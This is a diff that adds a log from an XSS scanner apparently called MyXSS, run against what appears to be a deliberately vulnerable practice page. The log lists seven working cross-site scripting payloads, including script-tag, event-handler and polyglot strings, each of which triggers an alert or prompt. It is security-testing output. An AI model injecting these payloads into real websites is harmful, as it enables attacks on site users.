@@ -1,0 +1,23 @@
+_______________________________________ MyXSS scanning report _______________________________________
+[08:41:40] [VULNERABILITY] Vulnerability. POST form. At url https://brutelogic.com.br/gym.php
+[08:41:40] [VULNERABILITY] Vulnerability. POST form. Payload sent: <script>alert('XSS')</script>
+[08:41:40] [VULNERABILITY] Vulnerability. POST form. Payload file: c:\Users\Ilya\Desktop\xss\MyXSS\payloads\basic.txt
+[08:41:41] [VULNERABILITY] Vulnerability. POST form. At url https://brutelogic.com.br/gym.php
+[08:41:41] [VULNERABILITY] Vulnerability. POST form. Payload sent: <div onpointerover="alert(45)">MOVE HERE</div>
+[08:41:41] [VULNERABILITY] Vulnerability. POST form. Payload file: c:\Users\Ilya\Desktop\xss\MyXSS\payloads\div.txt
+[08:41:41] [VULNERABILITY] Vulnerability. POST form. At url https://brutelogic.com.br/gym.php
+[08:41:41] [VULNERABILITY] Vulnerability. POST form. Payload sent: <sCrIpt>alert(1)</ScRipt>
+[08:41:41] [VULNERABILITY] Vulnerability. POST form. Payload file: c:\Users\Ilya\Desktop\xss\MyXSS\payloads\exotic.txt
+[08:41:41] [VULNERABILITY] Vulnerability. POST form. At url https://brutelogic.com.br/gym.php
+[08:41:41] [VULNERABILITY] Vulnerability. POST form. Payload sent: <body onload=alert(/XSS/.source)>
+[08:41:41] [VULNERABILITY] Vulnerability. POST form. Payload file: c:\Users\Ilya\Desktop\xss\MyXSS\payloads\html5_tags.txt
+[08:41:41] [VULNERABILITY] Vulnerability. POST form. At url https://brutelogic.com.br/gym.php
+[08:41:41] [VULNERABILITY] Vulnerability. POST form. Payload sent: <img src=x onerror=alert('XSS');>
+[08:41:41] [VULNERABILITY] Vulnerability. POST form. Payload file: c:\Users\Ilya\Desktop\xss\MyXSS\payloads\img.txt
+[08:41:41] [VULNERABILITY] Vulnerability. POST form. At url https://brutelogic.com.br/gym.php
+[08:41:41] [VULNERABILITY] Vulnerability. POST form. Payload sent: ">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
+[08:41:41] [VULNERABILITY] Vulnerability. POST form. Payload file: c:\Users\Ilya\Desktop\xss\MyXSS\payloads\polyglot.txt
+[08:41:41] [VULNERABILITY] Vulnerability. POST form. At url https://brutelogic.com.br/gym.php
+[08:41:41] [VULNERABILITY] Vulnerability. POST form. Payload sent: <svg/onload=alert('XSS')>
+[08:41:41] [VULNERABILITY] Vulnerability. POST form. Payload file: c:\Users\Ilya\Desktop\xss\MyXSS\payloads\svg.txt
+[08:41:41] [VULNERABILITY] ____Scanning thread conclusion: Vulnerabilities found with payloads from all files____
